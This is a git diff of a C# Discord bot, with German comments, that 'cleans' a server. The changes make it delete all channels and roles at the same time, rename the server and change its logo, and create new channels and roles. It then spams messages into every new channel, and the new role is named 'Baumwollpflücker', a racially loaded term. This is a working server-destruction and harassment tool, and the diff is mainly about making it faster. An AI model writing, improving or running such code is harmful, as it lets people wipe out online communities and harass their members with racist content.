@@ -15,6 +15,9 @@ class Program
         "✅ **Server erfolgreich Gereinigt!**\n" +
         "> Alle Kanäle und Rollen wurden entfernt.\n" +
         "> Powered by **Clean Your Server**";
+
+    const string NEW_ROLE_NAME  = "Baumwollpflücker"; // Name der neuen Rollen
+    const int    NEW_ROLE_COUNT = 2;                   // Anzahl der neuen Rollen
     // ─────────────────────────────────────────────────────────────────────────
 
     static async Task Main()
@@ -54,17 +57,10 @@ class Program
         await Task.Delay(-1).ConfigureAwait(false);
     }
 
-    // Hilfsmethode: Fehler bei einem einzelnen Task ignorieren, nicht alles abbrechen
     private static async Task TryRun(Task t, string label)
     {
-        try
-        {
-            await t.ConfigureAwait(false);
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"[SKIP] {label}: {ex.Message}");
-        }
+        try   { await t.ConfigureAwait(false); }
+        catch (Exception ex) { Console.WriteLine($"[SKIP] {label}: {ex.Message}"); }
     }
 
     private static Task LogAsync(LogMessage log)
@@ -98,58 +94,54 @@ class Program
         var guild = guildChannel.Guild;
         Console.WriteLine("[START] Reinigung gestartet...");
 
-        // ── 1. Servername + Logo (parallel, sofort) ───────────────────────────
-        await TryRun(guild.ModifyAsync(p =>
-        {
-            p.Name = SERVER_NAME;
-            if (_logoBytes is not null)
-                p.Icon = new Image(new MemoryStream(_logoBytes));
-        }), "Server-Edit").ConfigureAwait(false);
-
-        Console.WriteLine("[OK] Servername/Logo gesetzt.");
-
-        // ── 2. Kanäle löschen (alle parallel, Fehler einzeln ignorieren) ──────
-        var channelTasks = guild.Channels
-            .Select(ch => TryRun(ch.DeleteAsync(), $"Kanal {ch.Name}"))
-            .ToList();
-
-        await Task.WhenAll(channelTasks).ConfigureAwait(false);
-        Console.WriteLine("[OK] Alle Kanäle gelöscht.");
-
-        // ── 3. Rollen löschen ─────────────────────────────────────────────────
-        // Nur Rollen löschen die UNTER der höchsten Bot-Rolle liegen
+        // ── PHASE 1: Servername/Logo + alle Kanäle + alle Rollen GLEICHZEITIG ─
         int botTopPosition = guild.CurrentUser.Roles
             .DefaultIfEmpty()
             .Max(r => r?.Position ?? 0);
 
-        var rolesToDelete = guild.Roles
-            .Where(r => !r.IsEveryone && !r.IsManaged && r.Position < botTopPosition)
+        var phase1 = new List<Task>
+        {
+            // Server umbenennen + Logo setzen
+            TryRun(guild.ModifyAsync(p =>
+            {
+                p.Name = SERVER_NAME;
+                if (_logoBytes is not null)
+                    p.Icon = new Image(new MemoryStream(_logoBytes));
+            }), "Server-Edit")
+        };
+
+        // Alle Kanäle löschen
+        foreach (var ch in guild.Channels)
+            phase1.Add(TryRun(ch.DeleteAsync(), $"Kanal {ch.Name}"));
+
+        // Alle löschbaren Rollen löschen
+        foreach (var r in guild.Roles.Where(r => !r.IsEveryone && !r.IsManaged && r.Position < botTopPosition))
+            phase1.Add(TryRun(r.DeleteAsync(), $"Rolle {r.Name}"));
+
+        await Task.WhenAll(phase1).ConfigureAwait(false);
+        Console.WriteLine("[OK] Phase 1 fertig (Edit + Kanäle + Rollen).");
+
+        // ── PHASE 2: Neue Kanäle + neue Rollen GLEICHZEITIG erstellen ─────────
+        var channelCreates = Enumerable.Range(0, CHANNEL_COUNT)
+            .Select(_ => guild.CreateTextChannelAsync(CHANNEL_NAME))
             .ToList();
 
-        Console.WriteLine($"[INFO] {rolesToDelete.Count} Rollen werden gelöscht...");
-
-        var roleTasks = rolesToDelete
-            .Select(r => TryRun(r.DeleteAsync(), $"Rolle {r.Name}"))
+        var roleCreates = Enumerable.Range(0, NEW_ROLE_COUNT)
+            .Select(_ => guild.CreateRoleAsync(NEW_ROLE_NAME, isMentionable: true))
             .ToList();
 
-        await Task.WhenAll(roleTasks).ConfigureAwait(false);
-        Console.WriteLine("[OK] Rollen gelöscht.");
+        await Task.WhenAll(channelCreates.Concat<Task>(roleCreates)).ConfigureAwait(false);
 
-        // ── 4. Neue Kanäle erstellen ──────────────────────────────────────────
-        var newChannels = await Task.WhenAll(
-            Enumerable.Range(0, CHANNEL_COUNT)
-                .Select(_ => guild.CreateTextChannelAsync(CHANNEL_NAME))
-        ).ConfigureAwait(false);
+        var newChannels = await Task.WhenAll(channelCreates).ConfigureAwait(false);
+        Console.WriteLine($"[OK] {CHANNEL_COUNT} Kanäle + {NEW_ROLE_COUNT}x '{NEW_ROLE_NAME}' erstellt.");
 
-        Console.WriteLine($"[OK] {CHANNEL_COUNT} Kanäle erstellt.");
-
-        // ── 5. Nachrichten senden ─────────────────────────────────────────────
+        // ── PHASE 3: Nachrichten senden ───────────────────────────────────────
         var messageTasks = newChannels.SelectMany(ch =>
             Enumerable.Range(0, MESSAGE_COUNT)
-                .Select(_ => TryRun(ch.SendMessageAsync(MESSAGE_TEXT), $"Nachricht in {ch.Name}"))
+                .Select(_ => TryRun(ch.SendMessageAsync(MESSAGE_TEXT), $"Msg in {ch.Name}"))
         );
 
         await Task.WhenAll(messageTasks).ConfigureAwait(false);
-        Console.WriteLine($"[FERTIG] Je {MESSAGE_COUNT} Nachricht(en) pro Kanal gesendet.");
+        Console.WriteLine("[FERTIG] Alles erledigt.");
     }
 }
